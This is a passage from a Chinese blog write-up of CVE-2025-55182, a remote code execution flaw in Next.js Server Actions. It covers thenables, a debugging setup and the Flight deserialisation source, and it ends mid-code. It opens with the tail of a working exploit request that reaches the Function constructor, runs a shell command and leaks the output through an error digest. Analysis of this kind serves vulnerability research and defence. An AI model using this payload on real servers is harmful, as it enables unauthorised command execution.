/&#x27;],&#123;encoding:&#x27;utf8&#x27;,timeout:5000&#125;);var res=r.stdout||r.stderr||&#x27;&#x27;;throw Object.assign(new Error(&#x27;EXECUTION_RESULT&#x27;),&#123;digest:res&#125;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span><br></pre></td></tr></table></figure>





<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="回调地狱"><a href="#回调地狱" class="headerlink" title="回调地狱"></a>回调地狱</h3><p>JavaScript设计初就作为一个纯异步的语言，大量的系统API在执行耗时操作时都是支持传入一个回调函数，当操作执行完毕时调用这个回调函数。</p>
<p>比如下面这个例子，当我们要完成“用户登录获取token-&gt;根据token获取用户id-&gt;根据id获取用户订单”这个流程时，其代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一步，登录获取用户 token</span></span><br><span class="line">request.<span class="title function_">login</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;pass&quot;</span>, <span class="function">(<span class="params">err, token</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="comment">// 第二步：拿着 token 获取用户信息</span></span><br><span class="line">	request.<span class="title function_">getProfile</span>(token, <span class="function">(<span class="params">err, user</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">// 第三步：拿着 userId 获取订单</span></span><br><span class="line">		request.<span class="title function_">getOrders</span>(user.<span class="property">id</span>, <span class="function">(<span class="params">err, orders</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="comment">// 最终，拿到订单数据</span></span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;订单列表&quot;</span>, orders);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>一旦这个流程太长，这个callback就会一直嵌套下去，导致代码可读性非常差，函数也很难复用。</p>
<h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h3><p>为了解决回调地狱的问题，ES6引入了Promise对象。Promise 将“嵌套”变成了“链式调用”，虽然仍然需要传入回调函数，但回调函数的调用回到了同一个上下文中。Promise 是 JavaScript 中用于处理异步操作的对象，它表示一个最终会完成（成功或失败）的操作及其结果值。Promise有三种对象，分别为pending（等待中）、fulfilled（已完成）和rejected（失败），状态一旦改变就不可逆了。</p>
<p>如果我们是Promise对象的使用者，我们需要关注的就是Promise对象提供的两个重要函数then()和catch()，当耗时任务执行成功时，then中的回调会被执行；当耗时任务执行失败时，catch中的回调将会被执行。</p>
<p>这样，1️⃣中的例子就可以修改成如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先获取登陆用户的token</span></span><br><span class="line"><span class="title function_">login</span>(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;pass&quot;</span>)</span><br><span class="line">	.<span class="title function_">then</span>(<span class="function">(<span class="params">token</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">//第二步，拿着获取的token获取用户信息，此时返回的仍然是一个Promise对象</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_">getProfile</span>(token);</span><br><span class="line">	&#125;)</span><br><span class="line">	.<span class="title function_">then</span>(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">//第三步，拿着获取的user用户信息去获取订单，此时返回的仍然是一个Promise对象</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_">getOrders</span>(user.<span class="property">id</span>);</span><br><span class="line">	&#125;)</span><br><span class="line">	.<span class="title function_">then</span>(<span class="function">(<span class="params">orders</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">//最终拿到订单数据</span></span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;订单列表&quot;</span>, orders);</span><br><span class="line">	&#125;)</span><br><span class="line">	.<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">//统一的错误处理</span></span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;错误日志&quot;</span>,err);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>

<p>可见，我们将上面的多层嵌套回调变成了一串then函数的调用，他们都在同一个上下文中，这极大优化了代码的可读性。</p>
<h3 id="如何设计Promise对象"><a href="#如何设计Promise对象" class="headerlink" title="如何设计Promise对象"></a>如何设计Promise对象</h3><p>前面的代码中，我们看到了Promise被使用时给代码带来的便利性，那么他是怎么被制造的呢？比如上面的login函数，我使用比较老的XMLHttpRequest API来编写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">	<span class="comment">// 1. 这里返回的是一个Promise对象</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">		xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/v1/login&quot;</span>);</span><br><span class="line">		xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">		<span class="comment">// 2. 监听成功回调 (onload)</span></span><br><span class="line">		xhr.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>) &#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					<span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">					<span class="comment">// 成功调用 resolve 函数</span></span><br><span class="line">					<span class="title function_">resolve</span>(data.<span class="property">token</span>);</span><br><span class="line">				&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">					<span class="comment">// 失败调用 reject 函数</span></span><br><span class="line">					<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;json error&quot;</span>));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// 失败调用 reject 函数</span></span><br><span class="line">				<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;request error&quot;</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// 3. 监听错误回调 (onerror)</span></span><br><span class="line">		xhr.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">			<span class="comment">// 失败调用 reject 函数</span></span><br><span class="line">			<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;network error&quot;</span>));</span><br><span class="line">		&#125;;</span><br><span class="line">		xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; username, password &#125;));</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现，Promise的本体也是一个回调函数，这个回调需要接收resolve和reject两个函数类型的参数。函数内部通常会执行异步任务，在任务成功完成时调用resolve，任务出错时调用reject。这样，即使像XMLHttpRequest这种老的API，我们也可以将其改造成Promise模式，只要在任何异步操作执行完毕后调用resolve()即可。resolve()就像一个通知器，调用它就是通知Promise外部，你可以继续执行then()了。</p>
<h3 id="async和await异步"><a href="#async和await异步" class="headerlink" title="async和await异步"></a>async和await异步</h3><p>Promise的出现解决了回调地狱的问题，但它本身仍然是需要一堆回调函数，和阅读直观的同步代码难度仍然有差距。</p>
<p>于是人们又在ES2017中引入了async&#x2F;await这两个关键词，await本质来说就是Promise.then()的语法糖：定义一个async异步函数，其实就是在定义一个会返回Promise的函数；而await执行一个异步函数，其实就是把await这一行代码后面的内容放在了这个Promise的then()中。</p>
<p>所以，2️⃣中的代码我们又可以进一步简化：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="keyword">const</span> token = <span class="keyword">await</span> <span class="title function_">login</span>(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">	<span class="keyword">const</span> user = <span class="keyword">await</span> <span class="title function_">getProfile</span>(token);</span><br><span class="line">	<span class="keyword">const</span> orders = <span class="keyword">await</span> <span class="title function_">getOrders</span>(user.<span class="property">id</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//最终拿到订单数据</span></span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;订单数据&quot;</span>,orders);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;错误日志&quot;</span>,err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码就基本和同步代码一致了，阅读起来毫无压力。</p>
<h3 id="Thenable的由来"><a href="#Thenable的由来" class="headerlink" title="Thenable的由来"></a>Thenable的由来</h3><p>回看JavaScript的发展，从ES5到ES6再到ES2017增加了很多新的对象和关键字，但是如果我们想让一个代码兼容老的js引擎，又想让其可以用在新的语法结构下，应该怎么办呢？</p>
<p>Promise是ES6引入的，ES5中没有这个对象，于是JavaScript提供了一个兼容机制，Thenable。</p>
<p>任何一个对象，只要它有一个名字叫then的函数，他就是一个Thenable对象，它可以替代Promise的功能，在await等需要Promise的位置使用。</p>
<p>比如我们先前使用XMLHttpRequest API编写的那个例子，我也可以改写成如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">	<span class="comment">// 不再返回Promise对象，而是返回一个Thenable对象</span></span><br><span class="line">	<span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="comment">// Thenable对象其实就是包含了 then 方法的对象</span></span><br><span class="line">		<span class="comment">// 引擎看到 await 后的对象有 then，就会自动注入 resolve 和 reject 两个函数</span></span><br><span class="line">        <span class="attr">then</span>: <span class="keyword">function</span> (<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">			xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/v1/login&quot;</span>);</span><br><span class="line">			xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">			<span class="comment">// 2. 监听成功回调 (onload)</span></span><br><span class="line">			xhr.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">                        <span class="comment">// 成功调用 resolve 函数</span></span><br><span class="line">                        <span class="title function_">resolve</span>(data.<span class="property">token</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        <span class="comment">// 失败调用 reject 函数</span></span><br><span class="line">                        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;json error&quot;</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 失败调用 reject 函数</span></span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;request error&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 3. 监听错误回调 (onerror)</span></span><br><span class="line">            xhr.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 失败调用 reject 函数</span></span><br><span class="line">                <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;network error&quot;</span>));</span><br><span class="line">            &#125;;</span><br><span class="line">            xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; username, password &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个完全没有用到Promise对象的login函数，我也可以使用await来调用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">const</span> token = <span class="keyword">await</span> <span class="title function_">login</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，对于一些需要高兼容性的SDK，使用Thenable这样的写法，既可以让最新的js引擎使用await来调用，也可以运行在古老的js引擎中。</p>
<h3 id="有得必有失"><a href="#有得必有失" class="headerlink" title="有得必有失"></a>有得必有失</h3><p>Thenable向下兼容性非常好，它几乎可以运行在任何JavaScript引擎下，但是代价是什么呢？</p>
<p>任何一个对象，只要其包含一个then函数，它就可以变成一个Thenable，被await调用。如果一个对象的key被用户所控制，那么就可以伪造出一个Thenable对象，这也是React2Shell CVE-2025-55182这个漏洞能够运行的原因之一。</p>
<h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-next-app@15.5.6 nextjs-cve-2025-55182 --yes</span><br></pre></td></tr></table></figure>

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/2.png" class="" title="image-20251214132858441">

<p>我这里安装的版本是存在漏洞的Next.js 15.5.6，其默认使用的打包工具是Turbopack（Webpack），内置的react-server-dom-turbopack版本是19.2.0。</p>
<p>要调试这个漏洞，世界上最简单的方法就是直接使用 –inspect 并配合Chrome浏览器，你甚至连编译器都不需要配置。</p>
<p>进入项目目录后，先设置环境变量 NODE_OPTIONS&#x3D;”–inspect” 再启动dev服务器即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set NODE_OPTIONS=&quot;--inspect&quot;</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/3.png" class="" title="image-20251214133303168">

<p>但是这里发现并没有开启调试端口，我们直接在命令中添加NODE_OPTIONS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx --node-options=--inspect next dev</span><br></pre></td></tr></table></figure>

<p>然后环境就构建好啦！</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/4.png" class="" title="image-20251214133640222">

<p>此时控制台会有debug相关的日志，可见node.js监听了一共三个端口：</p>
<ul>
<li>3000：这是Web应用的端口</li>
<li>9229：这是dev服务器守护进程的调试端口</li>
<li>9230：这是应用进程的调试端口</li>
</ul>
<p>Next的dev服务器是一个守护进程，它负责启动Web应用进程，执行一些管理操作，比如在开发者编辑代码后对代码进行重新加载。我们要调试的是Web应用的进程，而不是这个守护进程，这一点一定要注意，否则很有可能找不到要调试的代码。</p>
<p>然后我们就可以开始调试了。启动dev服务器，在Chrome浏览器中输入 <code>chrome://inspect/ </code>，就可以看到“Remote Target”，找到9230端口然后点击inspect就可以开始调试了。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/5.png" class="" title="image-20251214134419650">

<p>如果你这里没有9230端口，就可以点“Configure…”，手工增加一个9230端口的服务器：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/43.png" class="" title="image-20251214134315848">



<p>默认情况下，Chrome调试的时候不会加载node_modules中的source map，这会导致代码无法阅读。我们需要点右上角的配置：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/44.png" class="" title="image-20251214134550791">

<p>然后在忽略列表中把“Enable ignore listing”去掉，这样就不会忽略任何文件了：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/45.png" class="" title="image-20251214134625088">

<p>然后重启一下，我们在调试的时候就能看到解码后的源文件了。</p>
<p>第一次调试的时候，我们通常不知道应该在哪里下断点。比如这个漏洞中，我发现如果填入一些非json的字符串，服务端会返回JSON解析错误：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/6.png" class="" title="image-20251214141938978">

<p>那么我们就可以把断点下在所有异常的位置，勾选下述这俩</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/7.png" class="" title="image-20251214142022370">

<p>再发送数据包，我们就可以断到JSON.parse的位置：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/8.png" class="" title="image-20251214142211609">

<p>我们再从这个位置查看调用栈，并在关键的位置下断点，然后单步调试，一点一点跟整个数据流就可以了。</p>
<h2 id="RSC是如何解析数据包的"><a href="#RSC是如何解析数据包的" class="headerlink" title="RSC是如何解析数据包的"></a>RSC是如何解析数据包的</h2><h3 id="SSR-RSC"><a href="#SSR-RSC" class="headerlink" title="SSR &amp; RSC"></a>SSR &amp; RSC</h3><p>CVE-2025-55182这个漏洞就来源于Server Actions和React Server Components之中。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/9.png" class="" title="image-20251215130000551">



<p><strong>SSR Server-Side Rendering（服务端渲染）</strong> ：React原本是一个前端框架，但为了SEO优化和提升首次渲染速度，开发者使用SSR技术将首次渲染放在后端执行，并将渲染后的HTML代码返回给浏览器。但此后浏览器需要下载所有组件代码和依赖库，通过Hydration过程重新执行组件逻辑来绑定交互功能，这导致JavaScript bundle过大，可交互时间（TTI）很长。</p>
<p><strong>RSC React-Server-Components（React 服务端组件）</strong> ：React 18引入了React Server Components（React 19中稳定）。与传统SSR不同，ServerComponents的代码永远不会下载到浏览器 ——它们只在服务器执行，输出结果发送给客户端，不需要Hydration，这样可以使用庞大的依赖库（如数据库驱动）而不影响前端性能。</p>
<p><strong>ServerActions</strong> ：React 19以后引入，Server Actions允许开发者直接在组件中调用服务器端函数来修改数据，无需创建API端点。React会自动处理客户端-服务器通信、数据序列化和页面更新，大幅简化了表单提交和数据修改的开发流程。</p>
<p>最后，Server Actions实现的效果就像上图那样，我们可以在前端中直接编写后端代码，React会自动处理前后端的通信问题——而这个通信的流程，使用的就是Flight协议，CVE-2025-55182这个漏洞也是由此而来。</p>
<p>CVE-2025-55182虽然是RSC组件的漏洞，但实际上他是由Server Actions触发的。用户可控的数据流借由Server Actions的功能传入RSC中，导致漏洞产生。这也是为什么React 18中就引入RSC了，但只有React 19才受到漏洞影响。</p>
<h3 id="Server-Actions-Flight协议"><a href="#Server-Actions-Flight协议" class="headerlink" title="Server Actions &amp; Flight协议"></a>Server Actions &amp; Flight协议</h3><p>在RSC刚出来时，Flight协议设计是用来服务端返回给客户端的一种序列化格式，但是Server Actions引入以后，React也将其应用在了解析用户的输入上——其实这么说也不太严谨，如果我们抓包就会发现，请求包和返回包的格式还是有很大区别的：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/10.png" class="" title="image-20251215203655591">

<ul>
<li>请求包的每个字段都是一个合法的JSON，JSON中可能会有一部分字段借用了Flight协议的语法，Next.js官方代码注释中称这种格式为multiple flight rows</li>
<li>返回包是真正的Flight协议流，它的每一行都有一个固定的格式：<code>&lt;ID&gt;:&lt;Type Code&gt;&lt;Data&gt;</code>。ID是一个数字编号，Type Code是数据类型，Data是数据</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在react中，renderToHTMLOrFlightImpl函数负责html渲染输出，当http请求经过其进行处理的时候，会进入handleAction来完成<code>action request</code>的请求处理。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/11.png" class="" title="image-20251214145046953">

<p>那么我们进入到handleAction方法看看，进入到handleAction后首先会调用getServerActionRequestMetadata函数提取请求源数据。这是解析Server Actions的入口点。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/46.png" class="" title="image-20251214145345731">

<p>在getServerActionRequestMetadata函数中，将尝试提取header中的<code>next-action</code>，如果其已被定义，返回isFetchAction为true。同时如果 Content-Type 为 multipart&#x2F;form-data 类型，返回值isMultiparAction 取值为 true ，因此isPossibleServerAction返回的也是true。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/12.png" class="" title="image-20251214145958249">

<p>接着获取到后面用到的一些基本信息</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/13.png" class="" title="image-20251215204215028">

<blockquote>
<ul>
<li>actionId ：从HTTP header中拿到要执行的Server Action</li>
<li>isURLEncodedAction ：请求方法是POST且请求包Content-Type是application&#x2F;x-www-form-urlencoded</li>
<li>isMultipartAction ：请求方法是POST且请求包Content-Type是multipart&#x2F;form-data</li>
<li>isFetchAction ：请求方法是POST且actionId不为空</li>
<li>isPossibleServerAction ：isURLEncodedAction、isMultipartAction、isFetchAction这三个有一个是true</li>
</ul>
</blockquote>
<p>接着我们回到handleAction函数。慢慢跟进，先进入run</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/14.png" class="" title="image-20251214151306451">

<p>然后进入到这个<code>(匿名)</code>，回到handlerAction处</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/15.png" class="" title="image-20251214151405689">

<p>在后续处理中存在如下判断，如果 isMultiparAction 和 isFetchAction 均为 true ，那么将引入 busboy 这个库来做 http 解析，这个库常用来处理 multipart&#x2F;form-data 请求，与上面的判断条件一致：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/16.png" class="" title="image-20251214151644425">

<p>然后我们继续跟进，decodeReplyFromBusboy这个函数其实就是正式从Next.js进入到React Server Components内核的地方。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/17.png" class="" title="image-20251214152150764">

<p>进入decodeReplyFromBusboy函数。在 decodeReplyFromBusboy 函数中会完成 Flight 反序列化操作，对于 field 类型的请求 (不包含 file 上传)将通过 resolveField 进行处理</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/18.png" class="" title="image-20251214153022231">

<p>这里我们分析一下decodeReplyFromBusboy的源码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">decodeReplyFromBusboy</span> = <span class="keyword">function</span> (<span class="params"></span></span><br><span class="line"><span class="params">  busboyStream,</span></span><br><span class="line"><span class="params">  webpackMap,</span></span><br><span class="line"><span class="params">  options</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> response = <span class="title function_">createResponse</span>(</span><br><span class="line">      webpackMap,</span><br><span class="line">      <span class="string">&quot;&quot;</span>,</span><br><span class="line">      options ? options.<span class="property">temporaryReferences</span> : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">    ),</span><br><span class="line">    pendingFiles = <span class="number">0</span>,</span><br><span class="line">    queuedFields = [];</span><br><span class="line">  busboyStream.<span class="title function_">on</span>(<span class="string">&quot;field&quot;</span>, <span class="keyword">function</span> (<span class="params">name, value</span>) &#123;</span><br><span class="line">    <span class="number">0</span> &lt; pendingFiles</span><br><span class="line">      ? queuedFields.<span class="title function_">push</span>(name, value)</span><br><span class="line">      : <span class="title function_">resolveField</span>(response, name, value);</span><br><span class="line">  &#125;);</span><br><span class="line">  busboyStream.<span class="title function_">on</span>(<span class="string">&quot;file&quot;</span>, <span class="keyword">function</span> (<span 